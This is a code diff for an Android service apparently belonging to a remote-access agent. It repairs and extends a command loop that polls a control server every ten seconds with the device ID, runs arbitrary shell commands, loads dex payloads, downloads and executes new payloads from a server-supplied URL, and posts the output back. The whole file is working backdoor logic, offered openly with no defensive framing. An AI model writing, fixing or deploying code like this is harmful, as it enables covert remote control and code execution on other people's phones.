@@ -1,11 +1,14 @@
 package com.mobilemorph.agent.services;
 
-import java.security.Provider;
-import java.security.Provider.Service;
-import java.util.List;
-import java.util.Map;
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+import android.provider.Settings;
+import android.util.Log;
 
 import com.mobilemorph.agent.util.ShellExecutor;
+import com.mobilemorph.agent.util.DexLoader;
+import com.mobilemorph.agent.util.PayloadUpdater;
 
 import org.json.JSONObject;
 
@@ -17,37 +20,40 @@ import java.net.URL;
 
 public class CommandService extends Service {
     private static final String TAG = "CommandService";
-    private static final String SERVER_URL = "http://127.0.0.1:5000"; // use local IP if not emulator
-    private static final String DEVICE_ID =  Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-
-    public CommandService(Provider provider, String type, String algorithm, String className, List<String> aliases,
-            Map<String, String> attributes) {
-        super(provider, type, algorithm, className, aliases, attributes);
-        //TODO Auto-generated constructor stub
-    }
+    private static final String SERVER_URL = "https://10.0.2.2:5000"; // HTTPS support enabled
 
     private static final int START_STICKY = 0;
+    private String deviceId;
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "CommandService started");
+
+        // Device ID must be fetched from context
+        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 
         new Thread(() -> {
             while (true) {
                 try {
                     JSONObject cmd = fetchCommand();
                     if (cmd != null) {
-                        String type = command.optString("type");
-                        String payload = command.optString("payload");
+                        String type = cmd.optString("type");
+                        String payload = cmd.optString("payload");
                         String output = "";
-                        
-                        switch(type) {
+
+                        switch (type) {
                             case "exec":
                                 output = ShellExecutor.execute(payload);
                                 break;
                             case "dexload":
                                 DexLoader.loadAndExecute(getApplicationContext(), payload);
                                 output = "Executed dex payload: " + payload;
+                                break;
+                            case "update_payload":
+                                String url = cmd.optString("url");
+                                String path = cmd.optString("path");
+                                PayloadUpdater.updateAndLoad(getApplicationContext(), url, path);
+                                output = "Updated and executed dex payload from: " + url;
                                 break;
                             case "sleep":
                                 Thread.sleep(Long.parseLong(payload));
@@ -57,9 +63,11 @@ public class CommandService extends Service {
                                 output = "Unknown command type: " + type;
                                 break;
                         }
+
+                        postOutput(output);
                     }
-                    postOutput(output);
-                    Thread.sleep(10000); // Poll every 10 seconds
+
+                    Thread.sleep(10000);
                 } catch (Exception e) {
                     Log.e(TAG, "Error in command loop", e);
                 }
@@ -71,7 +79,7 @@ public class CommandService extends Service {
 
     private JSONObject fetchCommand() {
         try {
-            URL url = new URL(SERVER_URL + "/get_command/" + DEVICE_ID);
+            URL url = new URL(SERVER_URL + "/get_command/" + deviceId);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("GET");
 
@@ -83,7 +91,7 @@ public class CommandService extends Service {
             }
 
             JSONObject responseJson = new JSONObject(response.toString());
-            return responseJson.getString("cmd");
+            return responseJson.optJSONObject("cmd");
 
         } catch (Exception e) {
             Log.e(TAG, "fetchCommand() failed", e);
@@ -100,7 +108,7 @@ public class CommandService extends Service {
             conn.setDoOutput(true);
 
             JSONObject payload = new JSONObject();
-            payload.put("device_id", DEVICE_ID);
+            payload.put("device_id", deviceId);
             payload.put("output", output);
 
             OutputStream os = conn.getOutputStream();
@@ -108,7 +116,7 @@ public class CommandService extends Service {
             os.flush();
             os.close();
 
-            conn.getResponseCode(); // Force the POST to complete
+            conn.getResponseCode();
         } catch (Exception e) {
             Log.e(TAG, "postOutput() failed", e);
         }
@@ -116,6 +124,6 @@ public class CommandService extends Service {
 
     @Override
     public IBinder onBind(Intent intent) {
-        return null; // Not used
+        return null;
     }
 }
